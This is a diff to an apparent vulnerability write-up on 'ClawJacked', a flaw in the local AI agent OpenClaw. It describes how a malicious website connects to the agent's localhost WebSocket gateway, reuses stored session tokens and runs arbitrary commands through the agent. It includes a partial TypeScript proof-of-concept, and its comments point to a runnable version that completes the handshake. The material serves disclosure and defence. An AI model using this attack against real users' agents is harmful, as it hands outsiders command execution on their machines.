@@ -6,7 +6,7 @@ Oasis Security disclosed a critical vulnerability (Feb 2026) allowing malicious 
 
 ## Attack Flow
 
-1. Malicious website opens WebSocket connection to `ws://127.0.0.1:4000`
+1. Malicious website opens WebSocket connection to `ws://127.0.0.1:18789/gateway`
 2. Bypasses browser security via OpenClaw's direct localhost binding
 3. Authenticates using operator session tokens (stored in localStorage)
 4. Executes arbitrary commands against the local agent
@@ -14,15 +14,18 @@ Oasis Security disclosed a critical vulnerability (Feb 2026) allowing malicious 
 ## Demonstration Script
 
 ```typescript
-// web-poc.ts - Educational demonstration only
-// Requires OpenClaw running locally on 127.0.0.1:4000
+// Illustrative sketch only - the runnable version is web-poc.ts.
+// That file implements the WebSocket client on node's built-in `net` module,
+// so it has no dependency on the `ws` package, and it completes the documented
+// connect.challenge -> req/connect -> hello-ok handshake instead of stopping at
+// the connection. Requires OpenClaw on 127.0.0.1:18789 (the gateway default).
 
 import { WebSocket } from "ws";
 
 async function demonstrateClawJacked() {
   console.log("[+] Attempting ClawJacked-style connection...\n");
 
-  const ws = new WebSocket("ws://127.0.0.1:4000");
+  const ws = new WebSocket("ws://127.0.0.1:18789/gateway");
   ws.on("open", () => {
     console.log("[+] WebSocket connected to localhost");
     ws.send(JSON.stringify({ type: "hello", from: "research-poc" }));
